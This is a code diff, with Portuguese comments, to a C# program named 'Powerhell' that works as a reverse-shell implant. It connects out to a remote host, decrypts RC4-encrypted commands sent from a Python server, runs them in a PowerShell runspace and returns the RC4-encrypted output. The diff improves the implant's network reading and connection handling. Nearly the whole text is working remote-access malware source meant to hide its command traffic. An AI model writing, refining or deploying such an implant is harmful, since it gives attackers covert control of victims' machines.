@@ -5,6 +5,7 @@ using System.Management.Automation.Runspaces;
 using System.Net.Sockets;
 using System.Text;
 using System.Linq;
+using System.Collections.Generic;   // <-- novo
 
 namespace Powerhell
 {
@@ -60,40 +61,47 @@ namespace Powerhell
         {
             try
             {
-                using (TcpClient client = new TcpClient(host, port))
-                using (NetworkStream stream = client.GetStream())
-                using (Runspace runspace = RunspaceFactory.CreateRunspace())
+                using (TcpClient client = new TcpClient())
                 {
-                    runspace.Open();
-                    // Buffer ajustado para comandos de rede
-                    byte[] buffer = new byte[8192]; 
+                    client.NoDelay = true;                   // baixa latência
+                    // client.ReceiveTimeout = 30000;       // opcional
+                    // client.SendTimeout    = 30000;       // opcional
+                    client.Connect(host, port);
 
-                    while (true)
+                    using (NetworkStream stream = client.GetStream())
+                    using (Runspace runspace = RunspaceFactory.CreateRunspace())
                     {
-                        // 1. Receber comando do servidor Python
-                        int bytesRead = stream.Read(buffer, 0, buffer.Length);
-                        if (bytesRead == 0) break;
+                        runspace.Open();
 
-                        // Pegamos apenas os bytes realmente lidos para não descriptografar lixo do buffer
-                        byte[] encryptedData = new byte[bytesRead];
-                        Array.Copy(buffer, encryptedData, bytesRead);
+                        while (true)
+                        {
+                            /* ========================
+                               1) Receber comando
+                               ======================== */
+                            byte[] encryptedData = ReadFully(stream);
+                            if (encryptedData.Length == 0) break; // conexão foi encerrada
 
-                        // Descriptografar
-                        byte[] decryptedData = RC4(encryptedData, Encoding.UTF8.GetBytes(encryptionKey));
-                        string command = Encoding.UTF8.GetString(decryptedData).Trim('\0', ' ', '\n', '\r');
+                            string command = Encoding.UTF8
+                                .GetString(RC4(encryptedData, Encoding.UTF8.GetBytes(encryptionKey)))
+                                .Trim('\0', ' ', '\n', '\r');
 
-                        if (command.ToLower() == "exit") break;
+                            if (string.Equals(command, "exit", StringComparison.OrdinalIgnoreCase))
+                                break;
 
-                        // 2. Executar comando no PowerShell
-                        string result = ExecuteCommand(runspace, command);
+                            /* ========================
+                               2) Executar comando
+                               ======================== */
+                            string result = ExecuteCommand(runspace, command);
 
-                        // 3. Preparar resposta (Texto Puro -> UTF8 -> RC4 -> Enviar)
-                        // Removi o "PS >" daqui para evitar confusão de loops no servidor Python
-                        byte[] responseBytes = Encoding.UTF8.GetBytes(result); 
-                        byte[] encryptedResponse = RC4(responseBytes, Encoding.UTF8.GetBytes(encryptionKey));
+                            /* ========================
+                               3) Enviar resposta
+                               ======================== */
+                            byte[] responseBytes     = Encoding.UTF8.GetBytes(result);
+                            byte[] encryptedResponse = RC4(responseBytes, Encoding.UTF8.GetBytes(encryptionKey));
 
-                        stream.Write(encryptedResponse, 0, encryptedResponse.Length);
-                        stream.Flush(); // Garante o envio imediato
+                            stream.Write(encryptedResponse, 0, encryptedResponse.Length);
+                            stream.Flush();
+                        }
                     }
                 }
             }
@@ -101,6 +109,31 @@ namespace Powerhell
             {
                 Console.WriteLine("Erro na conexão: " + ex.Message);
             }
+        }
+
+        /* ============================================================
+           NOVO: lê da NetworkStream até não haver mais dados disponíveis
+           ============================================================ */
+        private static byte[] ReadFully(NetworkStream stream)
+        {
+            List<byte> data = new List<byte>();
+            byte[] buffer   = new byte[8192];
+
+            // Primeiro bloqueante — garante que espera ao menos um pacote
+            int bytesRead = stream.Read(buffer, 0, buffer.Length);
+            if (bytesRead == 0) return Array.Empty<byte>();
+
+            data.AddRange(buffer.Take(bytesRead));
+
+            // Depois, consome o que já chegou ao SO sem bloquear novamente
+            while (stream.DataAvailable)
+            {
+                bytesRead = stream.Read(buffer, 0, buffer.Length);
+                if (bytesRead == 0) break;
+                data.AddRange(buffer.Take(bytesRead));
+            }
+
+            return data.ToArray();
         }
 
         private static string ExecuteCommand(Runspace runspace, string commandText)
@@ -115,38 +148,31 @@ namespace Powerhell
                 {
                     Collection<PSObject> results = ps.Invoke();
                     foreach (var obj in results)
-                    {
                         if (obj != null)
                             output.AppendLine(obj.ToString());
-                    }
 
-                    if (ps.Streams.Error.Count > 0)
-                    {
-                        foreach (var err in ps.Streams.Error)
-                        {
-                            output.AppendLine("Erro: " + err.ToString());
-                        }
-                    }
+                    foreach (var err in ps.Streams.Error)
+                        output.AppendLine("Erro: " + err.ToString());
                 }
                 catch (Exception ex)
                 {
                     output.AppendLine("Erro de execução: " + ex.Message);
                 }
             }
-            
-            // Retorna um aviso se o comando não gerar saída (como comandos de criação de variáveis)
-            return output.Length > 0 ? output.ToString() : "Comando executado (sem retorno).\n";
+
+            return output.Length > 0
+                ? output.ToString()
+                : "Comando executado (sem retorno).\n";
         }
 
+        /* RC4 inalterado ------------------------------------------------ */
         private static byte[] RC4(byte[] data, byte[] key)
         {
             int[] s = Enumerable.Range(0, 256).ToArray();
             for (int i = 0, j = 0; i < 256; i++)
             {
                 j = (j + s[i] + key[i % key.Length]) % 256;
-                int temp = s[i];
-                s[i] = s[j];
-                s[j] = temp;
+                (s[i], s[j]) = (s[j], s[i]);
             }
 
             int x = 0, y = 0;
@@ -155,9 +181,7 @@ namespace Powerhell
             {
                 x = (x + 1) % 256;
                 y = (y + s[x]) % 256;
-                int temp = s[x];
-                s[x] = s[y];
-                s[y] = temp;
+                (s[x], s[y]) = (s[y], s[x]);
                 result[i] = (byte)(data[i] ^ s[(s[x] + s[y]) % 256]);
             }
             return result;
